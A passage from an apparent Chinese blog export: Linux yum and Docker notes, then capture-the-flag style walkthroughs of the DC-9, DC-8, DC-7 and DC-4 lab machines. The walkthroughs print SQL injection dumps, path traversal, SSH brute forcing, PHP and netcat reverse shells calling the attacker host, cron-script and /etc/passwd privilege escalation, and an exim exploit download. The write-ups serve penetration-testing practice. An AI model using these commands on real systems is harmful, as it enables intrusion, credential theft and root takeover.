1.0.2-1.2.2            installed\npam_pkcs11.i386           0.5.3-23               installed\npam_smb.i386              1.1.7-7.2.1            installed\nAvailable Packages &lt;&#x3D;&#x3D;底下则是『可升级』的或『未安装』的\npam.i386                  0.99.6.2-4.el5         base\npam-devel.i386            0.99.6.2-4.el5         base\npam_krb5.i386             2.2.14-10              base\n\n\n国内 yum 源\n网易（163）yum 源是国内较好的 yum 源之一 ，无论是速度还是软件版本，都非常的不错。\n将yum源设置为163 yum，可以提升软件包安装和更新的速度，同时避免一些常见软件版本无法找到。\n安装步骤首先备份&#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo\nmv &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo &#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo.backup\n\n下载对应版本 repo 文件, 放入 &#x2F;etc&#x2F;yum.repos.d&#x2F; (操作前请做好相应备份)\n\nCentOS5 ：http://mirrors.163.com/.help/CentOS5-Base-163.repo\nCentOS6 ：http://mirrors.163.com/.help/CentOS6-Base-163.repo\nCentOS7 ：http://mirrors.163.com/.help/CentOS7-Base-163.repo\n\nwget http:&#x2F;&#x2F;mirrors.163.com&#x2F;.help&#x2F;CentOS6-Base-163.repo\nmv CentOS6-Base-163.repo CentOS-Base.repo\n\n运行以下命令生成缓存\nyum clean all\nyum makecache\n\n除了网易之外，国内还有其他不错的 yum 源，比如中科大和搜狐。\n中科大的 yum 源，安装方法查看：https://lug.ustc.edu.cn/wiki/mirrors/help/centos\nsohu 的 yum 源安装方法查看: http://mirrors.sohu.com/help/centos.html\n阿里云的源：https://developer.aliyun.com/mirror/centos\n2 篇笔记配置本地Yum仓库\n实现此案例需要按照如下步骤进行。\n步骤一：搭建一个本地Yum，将RHEL6光盘手动挂载到&#x2F;media\n命令操作如下所示：\n[root@localhost ~]# mount &#x2F;dev&#x2F;cdrom &#x2F;media&#x2F;\nmount: block device &#x2F;dev&#x2F;sr0 is write-protected, mounting read-only\n[root@localhost ~]# mount | tail -1\n&#x2F;dev&#x2F;sr0 on &#x2F;media type iso9660 (ro)\n\n步骤二：将本地设置为客户端，进行Yum验证\nYum客户端需编辑配置文件，命令操作如下所示：\n[root@localhost ~]# cd &#x2F;etc&#x2F;yum.repos.d&#x2F;         &#x2F;&#x2F;必须在这个路径下\n[root@localhost yum.repos.d]# ls                  &#x2F;&#x2F;此路径下事先有配置文件的模板\nrhel-source.repo\n\n[root@localhost yum.repos.d]# cp rhel-source.repo rhel6.repo &#x2F;&#x2F;配置文件必须以.repo结尾\n[root@localhost yum.repos.d]# vim rhel6.repo\n[rhel-6]                                     &#x2F;&#x2F;中括号里内容要求唯一，但不要出现特殊字符\nname&#x3D;Red Hat Enterprise Linux 6           &#x2F;&#x2F;此为描述信息，可以看情况填写\nbaseurl&#x3D;file:&#x2F;&#x2F;&#x2F;media&#x2F;                     &#x2F;&#x2F;此项为yum软件仓库位置，指向光盘挂载点\nenabled&#x3D;1                                   &#x2F;&#x2F;此项为是否开启，1为开启, 0为不开启\ngpgcheck&#x3D;1                                  &#x2F;&#x2F;此项为是否检查签名，1为检测, 0为不检测\ngpgkey&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;pki&#x2F;rpm-gpg&#x2F;RPM-GPG-KEY-redhat-release  &#x2F;&#x2F;签名认证信息的路径\n\n[root@localhost &#x2F;]# yum repolist\nLoaded plugins: product-id, refresh-packagekit, security, subscription-manager\nThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.\nrhel-6                                            | 3.9 kB     00:00 ... \nrhel-6&#x2F;primary_db                                  | 3.1 MB     00:00 ... \nrepo id             repo name                                     status\nrhel-6              Red Hat Enterprise Linux 6                    3,690\nrepolist: 3,690\n\n2\n对于 Linux 软件安装时提示缺失库的，可以使用 yum 的 provides 参数查看 libstdc++.so.6 的库文件包含在那个安装包中只需要执行：\nyum provides libstdc++.so.6\n\n然后按查询到安装包包名，使用 yum install 安装即可。\nps\napt配置国内源\n\n十：Docker基础命令与应用\n查看docker是否开启服务\n[root@mycentos ~]# systemctl list-unit-files | grep docker\ndocker.service                                disabled\ndocker.socket                                 disabled\n这里disabled说明docker服务不会随操作系统的启动而自启动\n\nsystemctl enable docker  #设置docker开机自启\n\n\n\n\ndocker拉取镜像慢换国内镜像\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/farkuai/article/details/127711847\nhttps://blog.csdn.net/u012081441/article/details/104553145\n查看镜像:docker images\n[root@mycentos ~]# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED         SIZE\nmysql         5.6       dd3b2a5dcb48   13 months ago   303MB\nhello-world   latest    feb5d9fea6a5   16 months ago   13.3kB\n\n\n搜索公共仓库有哪些镜像:docker search xxx\n[root@mycentos ~]# docker search mysql\nNAME                            DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED\nmysql                           MySQL is a widely used, open-source relation…   13728     [OK]       \nmariadb                         MariaDB Server is a high performing open sou…   5238      [OK]       \nphpmyadmin                      phpMyAdmin - A web interface for MySQL and M…   726       [OK]       \npercona                         Percona Server is a fork of the MySQL relati…   599       [OK]       \ndataback&#x2F;mysql-backup           Back up mysql databases to... anywhere!         80                   \nbitnami&#x2F;mysql                   Bitnami MySQL Docker Image                      80                   [OK]\nlinuxserver&#x2F;mysql-workbench                                                     48                   \nubuntu&#x2F;mysql                    MySQL open source fast, stable, multi-thread…   41                   \n#OFFICIAL有ok一般说明这个镜像是官方的    \n\n拉取镜像(默认情况下,会拉取最新版本镜像,如需拉取指定版本,需要指定TAG标签):docker pull xxx\n[root@mycentos ~]# docker pull hello-world\nUsing default tag: latest\nlatest: Pulling from library&#x2F;hello-world\n2db29710123e: Pull complete\nDigest: sha256:aa0cc8055b82dc2509bed2e19b275c8f463506616377219d9642221ab53cf9fe\nStatus: Downloaded newer image for hello-world:latest\ndocker.io&#x2F;library&#x2F;hello-world:latest\n\n创建容器:docker create hello-world\n[root@mycentos ~]# docker create hello-world\na2c77e015d1af0e5249e613fb4778c712cc92f62b113c93998595bf564014403\n\n创建容器并指定容器名:docker create --name hello-docker hello-world\n[root@mycentos ~]# docker create --name hello-docker hello-world\n54166af69c544d78a2573e1cffe0b9ea4f138f0afc1ffe6242b8ba810835fc39\n[root@mycentos ~]# docker container ls -a\nCONTAINER ID   IMAGE         COMMAND    CREATED          STATUS    PORTS     NAMES\n54166af69c54   hello-world   &quot;&#x2F;hello&quot;   13 seconds ago   Created             hello-docker\n[root@mycentos ~]# \n\n\n查看当前环境里面有哪些容器:docker container ls -a(查看所有容器,不管有没有运行),docker ps(查看运行中的容器)\n[root@mycentos ~]# docker container ls -a\nCONTAINER ID   IMAGE         COMMAND    CREATED              STATUS    PORTS     NAMES\na2c77e015d1a   hello-world   &quot;&#x2F;hello&quot;   About a minute ago   Created             modest_montalcini\n\n启动容器:docker start xxx(容器名)\n[root@mycentos ~]# docker start hello-world\nError response from daemon: No such container: hello-world\nError: failed to start containers: hello-world\n失败,因为我没有为hello-world镜像指定容器名,docker会默认分配一个,要用docker默认分配的文件名才行\n&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\n[root@mycentos ~]# docker start modest_montalcini\nmodest_montalcini\n&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\n[root@mycentos ~]# docker container ls -a\nCONTAINER ID   IMAGE         COMMAND    CREATED         STATUS                     PORTS     NAMES\na2c77e015d1a   hello-world   &quot;&#x2F;hello&quot;   8 minutes ago   Exited (0) 2 minutes ago             modest_montalcini\n\n删除容器:docker rm xxx(容器名)\n[root@mycentos ~]# docker rm  modest_montalcini\nmodest_montalcini\n[root@mycentos ~]# docker container ls -a\nCONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES\n[root@mycentos ~]# \n\n删除镜像:docker rmi xxx(镜像名)\n[root@mycentos ~]# docker images\nREPOSITORY    TAG       IMAGE ID       CREATED         SIZE\nmysql         5.6       dd3b2a5dcb48   13 months ago   303MB\nhello-world   latest    feb5d9fea6a5   16 months ago   13.3kB\n[root@mycentos ~]# docker rmi hello-world\nUntagged: hello-world:latest\nUntagged: hello-world@sha256:aa0cc8055b82dc2509bed2e19b275c8f463506616377219d9642221ab53cf9fe\nDeleted: sha256:feb5d9fea6a5e9606aa995e879d862b825965ba48de054caab5ef356dc6b3412\nDeleted: sha256:e07ee1baac5fae6a26f30cabfe54a36d3402f96afda318fe0a96cec4ca393359\n[root@mycentos ~]# docker images\nREPOSITORY   TAG       IMAGE ID       CREATED         SIZE\nmysql        5.6       dd3b2a5dcb48   13 months ago   303MB\n[root@mycentos ~]# \n\n创建并启动容器(把create和start并成一步启动):docker run\n[root@mycentos ~]# docker run --name 111 hello-world\n\nHello from Docker!\nThis message shows that your installation appears to be working correctly.\n\nTo generate this message, Docker took the following steps:\n 1. The Docker client contacted the Docker daemon.\n 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.\n    (amd64)\n 3. The Docker daemon created a new container from that image which runs the\n    executable that produces the output you are currently reading.\n 4. The Docker daemon streamed that output to the Docker client, which sent it\n    to your terminal.\n\nTo try something more ambitious, you can run an Ubuntu container with:\n $ docker run -it ubuntu bash\n\nShare images, automate workflows, and more with a free Docker ID:\n https:&#x2F;&#x2F;hub.docker.com&#x2F;\n\nFor more examples and ideas, visit:\n https:&#x2F;&#x2F;docs.docker.com&#x2F;get-started&#x2F;\n\n[root@mycentos ~]# docker container ls -a\nCONTAINER ID   IMAGE         COMMAND    CREATED         STATUS                     PORTS     NAMES\nc02d9b731c06   hello-world   &quot;&#x2F;hello&quot;   9 seconds ago   Exited (0) 9 seconds ago             111\n[root@mycentos ~]# \n\n\n\n把docker的80端口映射在本机的2023端口。这样访问本机的2023端口就能直接使用docker容器\n[root@mycentos ~]# docker run -p 2023:80 -d mcc0624&#x2F;ser:1.8\n2d591ece6e1e78ec6549f47b9a776551375eb758f1ea3d0f3e4ed9eabcd03bdd\n[root@mycentos ~]# \n\n","slug":"Linux操作系统","date":"2023-01-12T04:13:11.493Z","categories_index":"操作系统安全","tags_index":"Linux","author_index":"Abyssaler"},{"id":"46f95e1a6a53e9fcd0762e6351e3937a","title":"DC-9靶机渗透","content":"DC-9渗透全流程一:实验环境kali攻击机: 192.168.2.104\nDC-9靶机: 192.168.2.103\n二:信息收集主机发现arp-scan -l\n\nnmap -sn 192.168.2.0/24\n\n端口扫描masscan --rate=10000 --ports 0-65535 192.168.2.103\n\n没找到,换一种方式\nnmap -PA 192.168.2.0/24\n\nnmap -sS 192.168.2.103\n\n发现开启了22,80端口\n对端口做细致扫描\nnmap -p22,80 -sV -A 192.168.2.103\n\n目录扫描dirsearch -u http://192.168.2.103/ -e*\n\n指纹识别直接用whatweb和wappalyzer都无法识别出cms\n\n只能觉得这个界面看起来像drupal\n\n三:渗透测试burp suite+sqlmap注意到有一个搜索页面和登录页面,考虑是不是有sql注入点\n在search栏输入文本,用burp suite捕获请求\n\n可以看到一个post请求\n\n复制捕获的请求并将其粘贴到一个文本文件中,并将其命名为dc-9.txt,这样可以将捕获的请求与sqlmap一起使用\n\n保存为txt文件\n\nps: sqlmap -u 默认使用的是get方式来注入的\n使用sqlmap枚举数据库\nsqlmap -r dc-9.txt --dbs --batch# -r :从文件中加载http请求 –batch :默认回答  \n\n首先枚举staff数据库\nsqlmap -r dc-9.txt -D Staff --dump-all --batch # –dump-all 获取所有的记录\n发现了有两张表,StaffDetails表和Users表\n\n\n+--------+----------------------------------+----------+\n| UserID | Password                         | Username |\n+--------+----------------------------------+----------+\n| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |\n+--------+----------------------------------+----------\n\n可以使用hash-identifier测试一下密文的种类\n\n可能是一个md5的密码,在线解密试试\n\n 得到明文transorbital1\n账号:admin  密码:transorbital1\n接着枚举users数据库\n只有一张表\n\n可以看到这个表上面爆出来的职员表的账号信息\n我们可以把用户和对应的密码储存在一个txt文件中\n1.txt\n\nawk -F &quot;|&quot; &#39;&#123;print $6&#125;&#39; 1.txt &gt;username.txt\n\nawk -F &quot;|&quot; &#39;&#123;print $4&#125;&#39; 1.txt &gt;password.txt\n\n可以发现字段前都有个空格\n删除空格\nvim username.txt\n输入%s/ //g\n\n可以看到空格被删除了\n同样的方法处理password.txt\n我们就得到了username.txt和password.txt两个文件了\n文件包含漏洞利用首先利用得到的管理员账号登录后台\n\n收集到一个重要信息File does not exist\n提示”文件不存在”,这意味着页脚中必须包含一个文件,但是该文件现在丢失或放错位置了,我们知道,在有include函数的地方,我们就有可能找到一个文件上传漏洞\n\n\n\n\n\n\n\n\n\n\n文件包含漏洞原理介绍\nhttps://blog.csdn.net/qq_42133828/article/details/83927058\n枚举文件,一层一层的查看,最终找到passwd文件位置\nhttp://192.168.2.103/welcome.php?file=../../../../../../etc/passwd\n\n利用端口敲门服务开启ssh端口通过之前的信息收集我们知道,靶机的22端口是有过滤的\n\n什么是端口敲门\n\n\n\n\n\n\n\n\n\n参考文章\nhttps://zhuanlan.zhihu.com/p/59488488\nhttps://www.cnblogs.com/wsjhk/p/5508051.html\nhttps://cloud.tencent.com/developer/news/477568\n​\t端口敲门（Port knocking）技术，可以理解为密码或者暗号服务，简单来说，就是访问“预先设定好的顺序端口”，服务器收到某客户端的端口尝试序列后，动态修改防火墙规则，打开某特定端口,这时候，这个端口就可以被某IP进行访问了。访问顺序端口跟敲门一样，也类似于密码或者暗号。\n利用(很不容易被想到)\n首先找到knockd.conf这个文件,如果找到了就意味着涉及到端口敲门\nhttp://192.168.2.103/welcome.php?file=../../../../../../etc/knockd.conf\n使用nc依次访问该ip对应的三个端口\nnc -nv 192.168.2.103 7469\nnc -nv 192.168.2.103 8475\nnc -nv 192.168.2.103 9842\n最后用nmap验证22端口是否被打开\nnmap -p 22 192.168.2.103\n\nhydra暴力破解hydra -L username.txt -P password.txt ssh://192.168.2.103\n最后得到了三个用户的访问权限\n[22][ssh] host: 192.168.2.103   login: chandlerb   password: UrAG0D!\n[22][ssh] host: 192.168.2.103   login: joeyt   password: Passw0rd\n[22][ssh] host: 192.168.2.103   login: janitor   password: Ilovepeepee\n\n\nssh用户登录依次访问爆破出来的用户,发现在janitor用户的用户文件夹下有一个隐藏文件夹\n\n访问后发现是一个存放密码的文本文件\n将密码导入之前创建的password.txt中,再用hydra破解\n发现破解出了一个新的用户\n\n再用这个用户尝试登录\n登录成功\n\n提权直接sudo su -尝试提权\n发现不能执行,但是不是未授权\n\nsudo -l查看一下\n看到了一个root权限的命令\n\n进入目录查看下这个程序\n\n发现全是乱码,上网查证后发现,真正的test文件在它的上两级目录,也就是/opt/devstuff中\n进入目录查看\n\n发现是一个python脚本,大意是一个简单的数据追加程序,将以2个文件作为参数,然后将第一个文件的内容附加到第二个文件中\n\n可以在kali端本地建一个拥有root权限的账户,再把这个用户的信息通过这个脚本写到靶机的&#x2F;etc&#x2F;passwd文件中储存,这样就得到了一个拥有root权限的账户\nkali端执行\n用openssl先创建一个本地的加密用户:\nopenssl passwd -1 -salt hacker 123456\n-1 的意思是使用md5加密算法\n-salt 自动插入一个随机数作为文件内容加密,即加盐\n\n$1$test$at615QShYKduQlx5z9Zm7/\n靶机端执行\necho &#39;hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/bin/bash&#39; &gt;&gt;/tmp/hacker\nsudo /opt/devstuff/dist/test/test /tmp/hacker /etc/passwd\nsu - hacker\n\n找到flag\n\n","slug":"DC-9靶机渗透","date":"2023-01-12T03:44:50.829Z","categories_index":"渗透从入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"a9be34afb12b0e30cb59efc97ce55ff4","title":"DC-8靶机渗透","content":"DC-8靶机渗透全流程一:实验环境kali攻击机: 192.168.2.104\nDC-8靶机: 192.168.2.105\n二:信息收集主机发现arp-scan -l\n\n发现靶机IP地址:192.168.2.105\n端口扫描nmap -A 192.168.2.105\n\n发现靶机开放端口22,80,同时发现cms是drupal 7\n目录扫描dirsearch -u http://192.168.2.105/ -e*\n\nweb信息收集访问靶机web页面http://192.168.2.105\n发现url可以传参\n\n测试sql注入\n构造http://192.168.2.105/?nid=1&#39; -- aa发现web界面报错,说明我们存在sql注入\n\n三:渗透测试sqlmap尝试注入既然存在sql注入,使用sqlmap来试试\nsqlmap -u &quot;http://192.168.2.105/?nid=1&quot;\n发现存在多种注入漏洞\n\n爆库名\nsqlmap -u &quot;http://192.168.2.105/?nid=1&quot; --dbs\n\n爆表名\nsqlmap -u &quot;http://192.168.2.105/?nid=1&quot; -D d7db --tables\n从爆出来的一堆表名中看到了一个user表\n\n爆字段\nsqlmap -u &quot;http://192.168.2.105/?nid=1&quot; -D d7db -T users --columns\n\n查询信息\nsqlmap -u &quot;http://192.168.2.105/?nid=1&quot; -D d7db -T users -C &quot;uid,name,pass&quot; --dump\n\n得到了加密信息\njohn解密admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z\njohn:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku&#x2F;3if&#x2F;oRVZJaz5mKC2vF\n\n将密文放入dc-8.txt,然后用john进行破解\njohn dc-8.txt\n\n只破译出了john用户,admin破译不出来(尝试了十几分钟)\n反弹shell通过之前的目录扫面我们知道了有用户登录页面\nhttp://192.168.2.105/user/login\n用破解出来的账户登录\n\n进入了后台就可以尝试寻找能够上传php代码的地方写shell了\n经过一番查找发现在contact us页面可以修改\n\n\n写入shell\n&lt;?php system(&quot;nc -e /bin/sh 192.168.2.104 444&quot;); ?&gt;\n\n保存后访问该页面,同时记得kali开启监听\nnc -lvp 444\n然后回到view页面,提交\n\n\n成功拿到shell\n获得交互式界面python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;\n\n提权查找SUID位的程序\nfind / -perm -u=s -user root 2&gt;/dev/null\n#-perm根据权限查找, -u&#x3D;s包含suid位的程序 -user root属主是root用户的, 2&gt;&#x2F;dev&#x2F;null 错误信息扔进垃圾桶\n\ndebian发行版(包括Ubuntu)使用exim4作为默认的邮件服务器\ncentos使用postfix作为默认的邮件服务器,早先版本使用的是sendmail\n看其版本\n/usr/sbin/exim4 --version\n或者\nexim4 --version\n\n使用searchsploit来寻找版本漏洞\nsearchsploit exim 4\n找到对应漏洞\n\n把脚本镜像到当前目录\nsearchsploit -m 46996.sh\n或者\ncp /usr/share/exploitdb/exploits/linux/local/46996.sh /root/Desktop复制到桌面\n\n利用python架设一个简单的http服务器让靶机来下载脚本\n先用python -V查看python版本\npython2用: python2 -m SimpleHTTPServer 2222\npython3用: python3 -m http.server 2222\n\n在靶机中下载脚本，只能在靶机的tmp目录下下载，因为&#x2F;tmp目录的权限大\n\nwget http://192.168.2.104:2222/46996.sh\n\n或者\n可以将脚本放到攻击机的apache目录下，然后再使用获得的靶机的shell下载\n或者也可以在此链接直接下载该exp：https://www.exploit-db.com/exploits/46996\n复制脚本到目录&#x2F;var&#x2F;www&#x2F;html下:cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html\n\n启动apache服务:service apache2 start\nwget http://192.168.2.104/46996.sh\n\n此时脚本是没有执行权限的,我们要手动添加执行权限chmod +x 46996.sh\n\n 根据exp的提示，执行该脚本./46996.sh -m netcat\n\n提权成功\n注意过一段时间后连接就会断开,要重新执行脚本才行,所以操作要快\n找到flag\n\nps如果版本过低,可能会遇到执行脚本报错问题\n原因是：shell.sh文件的格式为dos格式。linux只能执行格式为unix格式的脚本。\n使用set ff&#x3D;unix : 告诉 vim 编辑器，使用unix换行符，不然会无法执行脚本。\n所以修改一下攻击机目录下的shell脚本，在脚本最后加上set ff=unix\n","slug":"DC-8靶机渗透","date":"2023-01-12T03:44:50.827Z","categories_index":"渗透从入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"c1eb72cb53103af9058bb7d0064dfe74","title":"DC-7靶机渗透","content":"DC-7靶机渗透全流程一:实验环境kali攻击机: 192.168.2.103\nDC-7靶机: 192.168.2.105\n二:信息收集主机发现arp-scan -l\n\n端口扫描1.masscan快速扫描端口\nmasscan --rate=10000 --ports 0-65535 192.168.2.105 \n\n发现80,22端口\n2.nmap精确扫描端口\nnmap -p22,80 -sV -A 192.168.2.105 \n\n已经发现cms是drupal 8\nweb信息收集1.访问192.168.2.105\n收集页面信息\ncms: Drupal 8\n\n目录扫描dirb http://192.168.2.105\n\n利用社工获取网页源码注意到网页底部有个足迹\n\n尝试利用搜索引擎搜索他一下\n\n可以看到这个作者的GitHub账号了,点进去看看\n\n继续点进这个项目看看,可以看到这就是提示了\n\n那这些就是网站源码了\n\n可以直接下载下来进行审计分析\n三:渗透测试信息获取将之前下载下来的网页源码解压\n\n查看config.php文件\ncat config.php\n得到了数据库的账号密码\n\n远程连接主机既然有了账号和密码,有没有可能之前扫描出来的22端口也能用呢]\\\n尝试远程连接\nssh dc7user@192.168.2.105\n\n连接成功\n修改admin密码先进行一下系统的信息收集\n可以看到权限挺低的\n\n用crontab -l查看计划任务,mail查看邮件\n\nCron Daemon不太清楚意思,查询试试\n\n那这里的意思大概就是root用户周期性的运行了一个系统任务,脚本的位置在/opt/scripts/backups.sh\n\n查看邮件后得知这个系统任务的大概意思是为数据库做一个备份,还给出了备份的位置\n\n查看下脚本的权限ls -l，发现www-data拥有执行和写的权限，我们当前权限没有写权限，看来没办法动手脚了。\n但是如果我们获得了www-data的shell 那就可以写点东西进去，然后依靠计划任务，用root去运行，那我们可以获得了root权限的shell了。\n\n注意到脚本里有一个drush命令\n\n可以看到命令是进入 cd &#x2F;var&#x2F;www&#x2F;html&#x2F; 后执行drush。\n\n然后去百度看看 drush是干什么呢？\n\nDrush(Drush &#x3D; Drupal + Shell)就是使用命令行命令来操作Drupal站点，它的命令格式与git类似，都是双字命令（drush + 实际的命令）。既然是命令行命令，也就可以使用其他脚本来实现相同的功能，比如编写shell脚本来实现相同的功能，也的确有不少人这样做过。但是，使用Drush要远优于编写自己的脚本，好处在于，一是可以利用Drush开发社区的力量，二是Drush的命令更加可靠，适用于更多变的环境。\n\nhttps:&#x2F;&#x2F;www.howtoing.com&#x2F;a-beginner-s-guide-to-drush-the-drupal-shell\n\n这里有写一些drush基本语法。\n\ndrush user-password admin --password&#x3D;&quot;new_pass&quot; \n#想要更改您的密码？就这么简单。\n#记得执行命令前先切换到Drupal的目录下面。\ncd &#x2F;var&#x2F;www&#x2F;html&#x2F;\n#Drupal默认账户是admin  123456为我修改的密码。\ndrush user-password admin --password&#x3D;123456\n\n\n修改成功\n获得www-data的shell登录网站后台\n\n进入后台,找到能写shell的地方\n在extend中找到可以安装模块\n\n下载一个php模块\n下载地址:https://ftp.drupal.org/files/projects/php-8.x-1.x-dev.tar.gz\n直接安装\n\n\n启用php模块\n\n\n编辑文章\n\n此时可以看到,文章可以用php进行解析了\n\n写入一个 反弹shell脚本\n&lt;?php\n$sock &#x3D; fsockopen(&quot;192.168.2.103&quot;, &quot;444&quot;);\n$descriptorspec &#x3D; array(\n0 &#x3D;&gt; $sock,\n1 &#x3D;&gt; $sock,\n2 &#x3D;&gt; $sock\n);\n$process &#x3D; proc_open(&#39;&#x2F;bin&#x2F;sh&#39;, $descriptorspec, $pipes);\nproc_close($process);\n?&gt;\n\n\nkali开启nc监听\nnc -lvvp 444\n\n重新访问下主页\n\n反弹成功\n\n设置个交互式界面python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;\n\n可以看到,现在我们有向脚本里写入代码的权限了\n\n提权之前知道了,/opt/scripts/backup.sh会以root权限周期性的运行\n我们可以向backups.sh内写入反弹shell脚本,利用nc就可以完成\n然后如果是正常环境的话就等这个脚本运行的时候就成功了\necho &quot;nc -nv 192.168.2.103 4455 -e /bin/bash&quot; &gt;&gt;backups.sh\n\nkali开启侦听\nnc -nlvp 4455\n\n连接成功\n\n他这个默认十五分钟执行一次,等十五分钟就好啦\n得到flag\n\n\n","slug":"DC-7靶机渗透","date":"2023-01-12T03:44:50.825Z","categories_index":"渗透从入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"22a39128968d7f4772194c2471149c6e","title":"DC-4靶机渗透","content":"DC-4靶机渗透全流程一：实验环境靶机：DC-4（192.168.1.132）\n攻击机：kali2022.2（192.168.1.133）\n二：信息收集主机发现主机扫描：利用arp-scan工具扫描本地网络\n命令：arp-scan -l   扫描本地网络\n这里我是用的桥接模式，所以会同时扫描到同一网段中的其他主机\n\n发现其中有明显VMware特征的主机，就是dc-4靶机\n或者nmap -sn 192.168.1.0/24\n或者netdiscover -i eth0 -r 192.168.1.0/24\n都可以进行主机发现\n端口扫描nmap -A 192.168.1.132   综合扫描(开放的端口,服务版本,操作系统类型等)\n\n指纹识别whatweb 192.168.1.132\n\n目录扫描dirsearch -u http://192.168.1.132:80/ -e*\n\nweb页面信息\n信息收集总结\nIP &#x3D;&gt; 192.168.1.132\n开放的端口：\n22 &#x3D;&gt; ssh服务 —- OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n80 &#x3D;&gt; http服务 —- nginx 1.15.10\n\n\nOS &#x3D;&gt; Linux 3.2 - 4.9(debian)\nlinux kernel &#x3D;&gt; 3&#x2F;4\nnginx &#x3D;&gt; 1.15.10\n扫描出来的网站目录\n\n三：渗透测试一共就两个端口,一个一个试试咯\n22端口爆破没有更多信息,直接用hydra爆破试试\nhydra -l root -P /usr/share/wordlists/dirb/small.txt -vV -t 10 -o ssh.txt 192.168.1.132 ssh -s 22\n\n爆破失败,当然如果时间足够的话应该可以用大字典跑出来,这里先试试其他办法\n80端口\n显而易见的一个登录框,看到标题里有admin,猜测这个可能是用户名,再用burp爆破试试\n\n抓包,对密码进行爆破\n\n还真跑出结果来了\n\n密码是happy\n\n成功登录\n命令执行漏洞利用登进来后发现是命令执行的地方,猜测可能要用命令执行漏洞了\n\n有两个地方可以修改命令\n法一我们可以在前端修改代码,执行其他命令\n\n先改成whoami试试\n\n命令执行成功了\n\n法二burp suite抓包该数据\n\n发送到重放器中修改试试\n这里我修改成ls，发现返回的结果跟着发生了变化\n\n证明方法是可行的\n反弹shell既然能执行命令,也找不到其他突破口了,想到反弹shell\n首先测试靶机有没有nc工具\nwhich nc\n\nwhich命令的作用是，在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。. 也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。\n语法:which [文件...]\n\nnc 是 Linux下强大的网络命令行工具，主要用于 TCP、UDP、UNIX域套接字 相关的操作。它被设计成可以由其他程序灵活驱动可靠的后台工具，拥有 &quot;瑞士军刀&quot; 的美称\n\n结果是有的,开始反弹shell\nkali开启监听888端口\nnc -l -p 888\n-l 使用监听模式，管控传入的资料。\n-p&lt;通信端口&gt; 设置本地主机使用的通信端口。\n\n\n靶机把shell传过去\nnc -nv 192.168.1.133 888 -c /bin/bash\n-c 传递一个shell命令,&#x2F;bin&#x2F;bash就相当把受害主机的shell传过去了\n-n 不做名称解析,提高连接速度\n-v 显示详细信息\n\n\n反弹成功\n\n这样看太麻烦了，获取一个交互式的shell\npython -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n\n横向移动首先查看账户信息\ncat /etc/passwd\n\n注意到几个明显像是用户的id\n用ls /home验证\n\n开始信息收集\n\n发现一些目录,继续收集,然后看到了一个及其敏感的文件\n\n通过当前文件夹的名字和.bak后缀猜测这就是用户有关密码的备份文件\n这个时候当然要查看了\n\n查看一共有多少行命令\ncat old-passwords.bak | wc -l\n\n把受害者主机中的文件拷贝到kali主机\nscp /home/jim/backups/old-passwords.bak root@192.168.1.133:~/Desktop\n\n\n把用户名写入username.txt\n\n有用户名，有密码了，尝试用hydra破解远程的主机\nhydra -L username.txt -P old-passwords.bak 192.168.1.132 ssh\n\n经过漫长的等待后爆破成功\n\n用kali凭借jim用户登录系统,进入远程主机\nssh jim@192.168.1.132\n\n继续信息收集\n\n这个脚本好像没什么有用信息，但里面提示有bash，可能要提权\n继续查看mbox，好像是一封邮件，里面有许多有用信息\n\n提权利用kali的searchsploit查询漏洞\nsearchsploit exim\n\n可以看到这个邮箱系统是有漏洞的,可以利用这个漏洞提权,这里先不用,还有其他提权的办法\n查看邮件客户端 mail\n\n可以看到有一封邮件，输入邮件编号1查看内容\n\n可以看到邮件内容里直接就有密码。。。话说这公司心真大啊\n尝试一下sudo\n\n提示没有权限，要想办法提权了\n很幸运的，我们获得了另一个用户charles的id和password，尝试切换下用户\n\n提示我们可以用root权限去使用teehee命令\necho &quot;hack::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd\n\n提权成功!\n找到flag\n\n","slug":"DC-4靶机渗透","date":"2023-01-12T03:44:50.823Z","categories_index":"渗透从入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"c17a69eda9da12f79f4648a25efd8897","title":"DC-3靶机渗透","content":"DC-3靶机渗透全流程一:实验环境攻击机:kali2022(192.168.2.103)\n靶机:dc-3(192.168.2.102)\n二:信息收集主机发现netdiscover -i eth0 -r 